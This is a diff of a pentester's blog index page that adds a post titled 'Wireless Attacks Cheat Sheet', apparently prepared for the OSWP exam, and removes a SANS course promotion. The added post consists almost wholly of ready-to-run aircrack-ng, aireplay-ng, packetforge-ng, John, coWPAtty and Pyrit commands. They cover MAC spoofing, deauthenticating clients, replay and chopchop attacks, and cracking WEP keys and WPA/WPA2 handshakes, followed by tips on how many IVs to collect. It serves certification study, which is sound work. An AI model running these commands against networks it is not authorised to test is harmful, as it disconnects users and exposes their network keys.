@@ -267,6 +267,180 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://muua.cc/oswp-review/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="RBPi">
+      <meta itemprop="description" content="Peneration Tester">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RBPi's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/oswp-review/" class="post-title-link" itemprop="url">Wireless Attacks Cheat Sheet</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-06-29 07:42:00" itemprop="dateCreated datePublished" datetime="2020-06-29T07:42:00-07:00">2020-06-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2020-12-09 01:53:16" itemprop="dateModified" datetime="2020-12-09T01:53:16-08:00">2020-12-09</time>
+      </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/oswp-review/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="oswp-review/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>6.4k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><h3 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># macchanger --show &lt;interface name&gt;</span></span><br><span class="line">Current MAC: 00:f1:40:93:00:f5 (unknown)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Set the MAC XX:XX:XX:XX:XX:XX</span></span><br><span class="line">macchanger --mac=XX:XX:XX:XX:XX:XX mon0</span><br></pre></td></tr></table></figure>
+
+<h3 id="Open-the-Monitor-Mode"><a href="#Open-the-Monitor-Mode" class="headerlink" title="Open the Monitor Mode"></a>Open the Monitor Mode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># airmon-ng check kill &amp;&amp; ifconfig wlan1 down &amp;&amp; iwconfig wlan1 mode monitor &amp;&amp; ifconfig wlan1 up &amp;&amp; airmon-ng start wlan1 3</span></span><br><span class="line">root@bt:~<span class="comment"># airmon-ng check kill &amp;&amp; ifconfig mon0 down &amp;&amp; iwconfig mon0 mode monitor &amp;&amp; ifconfig mon0 up</span></span><br><span class="line"></span><br><span class="line">iwconfig &lt;interface name&gt; mode monitor channel &lt;channel number&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Injection-Test"><a href="#Injection-Test" class="headerlink" title="Injection Test"></a>Injection Test</h2><h4 id="Basic-Injection-Test"><a href="#Basic-Injection-Test" class="headerlink" title="Basic Injection Test"></a>Basic Injection Test</h4><p>(Single Card)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 &lt;interface name&gt;</span></span><br><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 mon0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Injection-Test-for-Hidden-or-Specific-SSID"><a href="#Injection-Test-for-Hidden-or-Specific-SSID" class="headerlink" title="Injection Test for Hidden or Specific SSID"></a>Injection Test for Hidden or Specific SSID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; &lt;interface name&gt;</span></span><br><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -e &#x27;STAGE TEST&#x27; -a 08:57:00:64:2E:B0 mon0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Card-to-Cad-Attack-Injection-Test"><a href="#Card-to-Cad-Attack-Injection-Test" class="headerlink" title="Card-to-Cad (Attack) Injection Test"></a>Card-to-Cad (Attack) Injection Test</h4><p>(Two Cards)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -i &lt;input interface&gt; &lt;interface name&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Wired-Equivalent-Privacy-WEP"><a href="#Wired-Equivalent-Privacy-WEP" class="headerlink" title="Wired Equivalent Privacy (WEP)"></a>Wired Equivalent Privacy (WEP)</h1><h2 id="Open-Authentication"><a href="#Open-Authentication" class="headerlink" title="Open Authentication"></a>Open Authentication</h2><h3 id="Cracking-WEP-with-Connected-Clients"><a href="#Cracking-WEP-with-Connected-Clients" class="headerlink" title="Cracking WEP with Connected Clients"></a>Cracking WEP with Connected Clients</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP Channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-WEP-via-a-Client"><a href="#Cracking-WEP-via-a-Client" class="headerlink" title="Cracking WEP via a Client"></a>Cracking WEP via a Client</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -2 -b &lt;AP MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;</span><br><span class="line">aircrack-ng -z &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-Clientless-WEP-Networks"><a href="#Cracking-Clientless-WEP-Networks" class="headerlink" title="Cracking Clientless WEP Networks"></a>Cracking Clientless WEP Networks</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):</span></span><br><span class="line">aireplay-ng -4 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -5 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt; (Need Card Support)</span><br><span class="line"></span><br><span class="line">packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; -l &lt;Source IP&gt; -k &lt;Dest IP&gt; -y</span><br><span class="line">&lt;xor filename&gt; -w &lt;output filename&gt;</span><br><span class="line"><span class="comment"># packetforge-ng -0 -a 08:57:00:64:2E:B0 -h 00:f1:40:93:00:f5 -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-0705-020358.xor -w arp-korek</span></span><br><span class="line"></span><br><span class="line">aireplay-ng -2 -r &lt;packet filename&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shared-Key-Authentication"><a href="#Shared-Key-Authentication" class="headerlink" title="Shared Key Authentication"></a>Shared Key Authentication</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -y &lt;keystream file&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt;</span><br><span class="line">&lt;interface&gt;</span><br><span class="line"><span class="comment"># aireplay-ng -1 6000 -e &#x27;STAGE TEST&#x27; -y wepshared-01-08-57-00-64-2E-B0.xor -a 08:57:00:64:2E:B0 -h 94:0c:6d:7c:ca:73 mon0</span></span><br><span class="line"></span><br><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WPA-WPA2"><a href="#WPA-WPA2" class="headerlink" title="WPA/WPA2"></a>WPA/WPA2</h1><h2 id="Cracking-WPA-WPA2-PSK-with-Aircrack-ng"><a href="#Cracking-WPA-WPA2-PSK-with-Aircrack-ng" class="headerlink" title="Cracking WPA/WPA2 PSK with Aircrack-ng"></a>Cracking WPA/WPA2 PSK with Aircrack-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a&lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"><span class="comment"># dictionary mode</span></span><br><span class="line">aircrack-ng -w &lt;wordlist&gt; &lt;capture&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Airolib-ng database</span></span><br><span class="line">aircrack-ng -r &lt;db name&gt; &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-JTR-and-Aircrack-ng"><a href="#Cracking-WPA-with-JTR-and-Aircrack-ng" class="headerlink" title="Cracking WPA with JTR and Aircrack-ng"></a>Cracking WPA with JTR and Aircrack-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">./john --wordlist=&lt;wordlist&gt; --rules --stdout | aircrack-ng -e &lt;ESSID&gt; -w - &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-coWPAtty"><a href="#Cracking-WPA-with-coWPAtty" class="headerlink" title="Cracking WPA with coWPAtty"></a>Cracking WPA with coWPAtty</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">genpmk -f &lt;wordlist&gt; -d &lt;hashes filename&gt; -s &lt;ESSID&gt;</span><br><span class="line">genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s <span class="string">&#x27;STAGE TEST WPA&#x27;</span></span><br><span class="line"></span><br><span class="line">cowpatty -r &lt;capture&gt; -d &lt;hashes filename&gt; -2 -s &lt;ESSID&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-Pyrit"><a href="#Cracking-WPA-with-Pyrit" class="headerlink" title="Cracking WPA with Pyrit"></a>Cracking WPA with Pyrit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">pyrit -r &lt;interface&gt; -o &lt;capture&gt; stripLive</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># dictionary mode</span></span><br><span class="line">pyrit -r &lt;capture&gt; -i &lt;wordlist&gt; -b &lt;AP MAC&gt; attack_passthrough</span><br><span class="line"></span><br><span class="line"><span class="comment"># database mode</span></span><br><span class="line">pyrit -i &lt;wordlist&gt; import_passwords</span><br><span class="line">pyrit -e &lt;ESSID&gt; create_essid</span><br><span class="line">pyrit batch</span><br><span class="line">pyrit -r &lt;capture&gt; -b &lt;AP MAC&gt; attack_db</span><br></pre></td></tr></table></figure>
+
+<h2 id="Airolib-ng"><a href="#Airolib-ng" class="headerlink" title="Airolib-ng"></a>Airolib-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> wifu &gt; essid.txt</span><br><span class="line">airolib-ng &lt;db name&gt; --import essid &lt;essid filename&gt;</span><br><span class="line">airolib-ng &lt;db name&gt; --import passwd &lt;wordlist&gt;</span><br><span class="line">airolib-ng &lt;db name&gt; --clean all</span><br><span class="line">airolib-ng &lt;db name&gt; --stats</span><br><span class="line">airolib-ng &lt;db name&gt; --batch</span><br><span class="line">airolib-ng &lt;db name&gt; --verify all</span><br><span class="line">aircrack-ng -r &lt;db name&gt; &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="General-Approach-to-Cracking-WEP-Keys"><a href="#General-Approach-to-Cracking-WEP-Keys" class="headerlink" title="General Approach to Cracking WEP Keys"></a>General Approach to Cracking WEP Keys</h1><ul>
+<li><p>Typically, you need 250000 or more unique IVs for 64-bit keys and 1.5 million or more for 128-bit keys.</p>
+</li>
+<li><p>Generally speaking, don’t try to crack the WEP key until you have at least 100000 IVs.</p>
+</li>
+<li><p>Start by trying 64-bit keys with ‘aircrack-ng -n 64 <capture filename>‘. If 64-bit WEP is used, it can usually be cracked in less than 5 minutes and usually less than 60 seconds with relatively few IVs. If the 64-bit key is not found in 5 minutes, restart Aircrack in generic mode with ‘aircrack-ng <capture filename>‘ and then, at each 100000 IVs mark, retry ‘aircrack-ng -n 64 <capture filename>‘ for 5 minutes.</capture></capture></capture></p>
+</li>
+<li><p>Once you hit 600000 IVs, switch to testing 128-bit keys.</p>
+</li>
+<li><p>Once you hit 2 million IVs, try changing the fudge factor to ‘-f 4’ and run it for at least 30 minutes and up to one hour. Retry, increasing the fudge factor by adding 4 to it each time. You should also try increasing the fudge factor whenever Aircrack-ng stops after having tried all possible keys.</p>
+</li>
+<li><p>All the while, keep collecting data. Remember the golden rule: “the more IVs, the better”. Also, check the next section on how to determine which options to use as these can significantly speed up cracking the WEP key. For example, if the key is entirely numeric, then it can take as few as 50000 IVs to crack a 64-bit key with the ‘-t’ parameter versus 200000 IVs without it. So if you have a hunch about the WEP key, it is worth trying a few variations.</p>
+</li>
+<li><p>The number of unique IVs that you need varies drastically depending on a number of factors. You can consider the following as a rough guideline:</p>
+<pre><code>○ FMS/KoreK 64-bit—250,000 Unique IVs
+○ FMS/KoreK 128-bit—1,500,000 Unique IVs
+○ PTW 64-bit—20,000 packets
+○ PTW 128-bit—40,000-85,000 packets</code></pre>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">Encryption</th>
+<th align="center">Password</th>
+<th align="center">Ivs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">WEP - Open Authentication</td>
+<td align="center">AA:BB:CC:DD:EE</td>
+<td align="center">16875</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="https://muua.cc/f90540f5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -465,162 +639,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://muua.cc/dda1607a/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="RBPi">
-      <meta itemprop="description" content="Peneration Tester">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="RBPi's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/dda1607a/" class="post-title-link" itemprop="url">SANS Computer Security Training & Certification</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-08-17 06:35:59" itemprop="dateCreated datePublished" datetime="2020-08-17T06:35:59-07:00">2020-08-17</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2020-12-09 01:53:16" itemprop="dateModified" datetime="2020-12-09T01:53:16-08:00">2020-12-09</time>
-      </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/dda1607a/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="dda1607a/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="Symbols count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>3.1k</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>3 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="OnDemand-Specials"><a href="#OnDemand-Specials" class="headerlink" title="OnDemand: Specials"></a>OnDemand: Specials</h1><p><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/specials">https://www.sans.org/ondemand/specials</a></p>
-<h2 id="Final-Week-Get-an-iPad-Pro-with-Apple-Pencil-Surface-Go-2-or-300-Off-with-OnDemand-Training"><a href="#Final-Week-Get-an-iPad-Pro-with-Apple-Pencil-Surface-Go-2-or-300-Off-with-OnDemand-Training" class="headerlink" title="Final Week! Get an iPad Pro with Apple Pencil, Surface Go 2, or $300 Off with OnDemand Training!"></a>Final Week! Get an iPad Pro with Apple Pencil, Surface Go 2, or $300 Off with OnDemand Training!</h2><p>SANS Institute’s professional, online information security training platform, <strong>OnDemand</strong>, allows you to complete world-class courses anywhere, at any time. Last Chance to get an iPad Pro with Apple Pencil, a Surface Go 2, or Take $300 Off with <strong>OnDemand</strong> training.</p>
-<p>SANS most popular long courses (5 or 6-day) are eligible for this limited time offer, simply use your preferred discount code when you checkout to participate.</p>
-<p><strong>OnDemand Special Offer Codes</strong> Offer Ends August 19, 2020</p>
-<ul>
-<li><strong>AP2033_Gray</strong> to receive an iPad Pro in Space Gray with Apple Pencil</li>
-<li><strong>AP2033_Silver</strong> to receive an iPad Pro in Silver with Apple Pencil</li>
-<li><strong>PC2033</strong> to receive a Surface Go 2 (128GB SSD)</li>
-<li><strong>300_2033</strong> to Take $300 Off</li>
-</ul>
-<p>See Special Offer Terms &amp; conditions below.</p>
-<h4 id="Get-started-by-following-three-easy-registration-steps"><a href="#Get-started-by-following-three-easy-registration-steps" class="headerlink" title="Get started by following three easy registration steps:"></a>Get started by following three easy registration steps:</h4><ol>
-<li>Choose a qualifying <strong><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/courses/all/?msc=od-specials">OnDemand</a></strong> long course (5 or 6-day)</li>
-<li>Use your preferred special offer code at checkout</li>
-<li>Pay for your course by August 19, 2020</li>
-</ol>
-<p><strong><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/?msc=od-specials">View OnDemand Courses</a></strong></p>
-<p><strong>Popular Courses</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/introduction-cyber-security/?msc=od-specials">SEC301: Intro to Cyber Security</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/security-essentials-bootcamp-style/?msc=od-specials">SEC401: Security Essentials Bootcamp Style</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/intrusion-detection-in-depth/?msc=od-specials">SEC503: Intrusion Detection In-Depth</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/hacker-techniques-exploits-incident-handling/?msc=od-specials">SEC504: Hacker Tools, Techniques, Exploits &amp; Incident Handling</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/network-penetration-testing-ethical-hacking/?msc=od-specials">SEC560: Network Penetration Testing and Ethical Hacking</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/windows-forensic-analysis/?msc=od-specials">FOR500: Windows Forensic Analysis</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.sans.org/ondemand/course/cyber-threat-intelligence/?msc=od-specials">FOR578: Cyber Threat Intelligence</a></li>
-</ul>
-<p>If you have questions regarding this offer, please write to <a href="mailto:support@sans.org">support@sans.org</a>. You can also call (301) 654-7267 [Mon-Fri, 9:00 a.m. - 8:00 p.m. United States Eastern Time].</p>
-<h3 id="Terms-amp-Conditions"><a href="#Terms-amp-Conditions" class="headerlink" title="Terms &amp; Conditions"></a>Terms &amp; Conditions</h3><p>The iPad Pro with Apple Pencil and the Surface Go 2 are only available to individuals in the United States or Canada. The $300 (USD) discount is available globally. This offer is valid from August 6, 2020 to August 19, 2020, and registration must be completed by this expiration date to participate in the offer. Promo offer valid for Long courses (5 &amp; 6-day) only. <strong>Promotional items are shipped directly from the manufacturer/supplier. Allow 4 to 6 weeks for iPad Pro with Apple Pencil or Surface Go 2 delivery. iPad Pro and Apple Pencil may ship separately. Allow additional time to ship to APO/FPO addresses.</strong> Canadian customers are responsible for paying any applicable duties, taxes or customs fees.</p>
-<p>These offers cannot be combined with any other offer or discount, including SANS Voucher Program or an OnDemand Bundle. This offer does not apply when courses are incorporated into certain larger SANS-related special programs, including the graduate program of the SANS Technology Institute. SANS course offerings are subject to change at any time, please refer back to <a target="_blank" rel="noopener" href="https://www.sans.org/">SANS.org</a> for up-to-date course information. SANS shall not be held liable for students who elect marketing promotions or discounts that are not consistent with their employer’s Standards of Conduct and/or procurement standards. SANS reserves the right to substitute this offer for an alternative product, service or cash award of approximately equivalent retail value.</p>
-<p><strong>Apple iPad Pro 128GB - Wi-Fi Only with Apple Pencil</strong></p>
-<ul>
-<li>Liquid Retina display</li>
-<li>11-inch (diagonal) LED-backlit with Multi-Touch and IPS technology</li>
-<li>A12Z Bionic chip with 64-bit desktop-class architecture</li>
-<li>iPadOS</li>
-<li>2388-by-1668 resolution at 264 pixels per inch (ppi)</li>
-<li>12MP Wide and 10MP Ultra Wide Camera</li>
-<li>4K video recording</li>
-<li>Face ID</li>
-<li>Bluetooth 5.0 technology</li>
-<li>Apple Pencil (2nd gen)</li>
-</ul>
-<p><strong>Microsoft Surface Go 2 Tablet in Silver</strong></p>
-<ul>
-<li>10.5” Touchscreen 1920 x 1080 (Full HD)</li>
-<li>Core m3 8100Y / 1.1GHz</li>
-<li>8 GB RAM</li>
-<li>128 GB SSD</li>
-<li>HD Graphics 615</li>
-<li>Wi-Fi Only</li>
-<li>128 GB SSD</li>
-<li>8 MP Camera</li>
-<li>Bluetooth 5.0</li>
-<li>Wi-Fi Only</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
@@ -766,7 +784,7 @@ if (document.querySelectorAll('.mermaid').length) {
 <script>
   function loadCount() {
     var d = document, s = d.createElement('script');
-    s.src = 'https://rbpi-blog.disqus.com/count.js';
+    s.src = 'https://rbpi.disqus.com/count.js';
     s.id = 'dsq-count-scr';
     (d.head || d.body).appendChild(s);
   }
